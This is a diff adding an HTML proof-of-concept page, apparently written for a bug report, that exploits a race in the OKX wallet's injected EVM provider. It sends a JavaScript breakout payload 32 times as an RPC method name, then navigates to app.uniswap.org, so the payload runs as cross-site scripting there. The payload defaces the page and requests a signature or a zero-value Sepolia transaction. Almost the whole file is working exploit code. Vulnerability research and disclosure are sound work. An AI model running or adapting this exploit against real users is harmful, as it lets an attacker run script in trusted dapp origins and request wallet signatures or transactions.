@@ -1,0 +1,60 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>OKX EVM callback race PoC</title>
+
+<h1>OKX EVM callback race PoC</h1>
+<label>
+  Action:
+  <select id="action">
+    <option value="sign">personal_sign (dummy message)</option>
+    <option value="tx">eth_sendTransaction (Sepolia only, zero value)</option>
+  </select>
+</label>
+<button id="run">Run PoC</button>
+<pre id="status"></pre>
+
+<script>
+const target = 'https://app.uniswap.org/';
+const status = document.querySelector('#status');
+const action = document.querySelector('#action');
+
+
+const commonPrefix = "`);if(!window.__okxRpcRaceAction){window.__okxRpcRaceAction=1;(async()=>{let p=ethereum;document.write('<!doctype html><meta name=viewport content=width=device-width><title>UXSS PoC</title><h1 id=okx-uxss>PWNED BY BADCAT UXSS</h1><p>Executed in: <b>'+location.origin+'</b></p>');alert(document.domain);";
+const getAccount = "let a=await p.request({method:'eth_accounts'});if(!a[0])a=await p.request({method:'eth_requestAccounts'});let from=a[0];if(!from)throw Error('No account');";
+const commonSuffix = "})().catch(e=>alert('wallet action rejected/failed @ '+location.origin+'\\n'+(e&&e.message||e)))}void(`";
+
+function makePayload(kind) {
+  if (kind === 'tx') {
+   
+    return commonPrefix
+      + "let c=await p.request({method:'eth_chainId'});if(c!=='0xaa36a7')throw Error('Refusing tx: switch to Sepolia first');"
+      + getAccount
+      + "let r=await p.request({method:'eth_sendTransaction',params:[{from:from,to:from,value:'0x0',data:'0x4f4b5820525043207261636520506f432064756d6d79'}]});alert('tx request resolved @ '+location.origin+'\\n'+r);"
+      + commonSuffix;
+  }
+
+  return commonPrefix
+    + getAccount
+    + "let r=await p.request({method:'personal_sign',params:['0x4f4b5820525043207261636520506f432064756d6d79',from]});alert('personal_sign resolved @ '+location.origin+'\\n'+r);"
+    + commonSuffix;
+}
+
+document.querySelector('#run').addEventListener('click', () => {
+  if (!window.ethereum?.request) {
+    status.textContent = 'Injected EVM provider tidak ditemukan.';
+    return;
+  }
+
+  const selectedAction = action.value;
+  const payload = makePayload(selectedAction);
+  status.textContent = 'Mengirim payload '+selectedAction+' lalu navigasi ke example.com...';
+
+ 
+  for (let i = 0; i < 32; i++) {
+    window.ethereum.request({ method: payload, params: [] }).catch(() => {});
+  }
+
+  location.replace(target);
+});
+</script>
